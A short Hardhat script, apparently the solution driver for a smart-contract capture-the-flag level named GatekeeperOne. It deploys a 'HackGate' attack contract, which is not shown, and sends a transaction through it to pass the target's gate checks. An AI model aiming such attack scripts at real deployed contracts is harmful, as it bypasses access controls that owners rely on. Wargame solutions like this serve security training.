import { ethers } from "hardhat";

const INSTANCE = "0xA0edD2bf7AB2dbB470AD554EEF638FC03AE686C0";

async function main() {
  const gate = await ethers.getContractAt("GatekeeperOne", INSTANCE);

  const HackGate = await ethers.getContractFactory("HackGate");
  const hackGate = await HackGate.deploy();
  await hackGate.deployed();

  const transactionData = HackGate.interface.encodeFunctionData("enter", [
    INSTANCE,
  ]);
  const transaction = {
    to: hackGate.address,
    data: transactionData,
    gasLimit: 200000,
  };
  const signer = (await ethers.getSigners())[0];
  const tx = await signer.sendTransaction(transaction);
  await tx.wait();
  (await gate.entrant()) === hackGate.address
    ? console.log("Successfully attack the contract")
    : console.log("Attack contract failed");
}

main().catch((err) => {
  console.error(err);
  process.exitCode = 1;
});
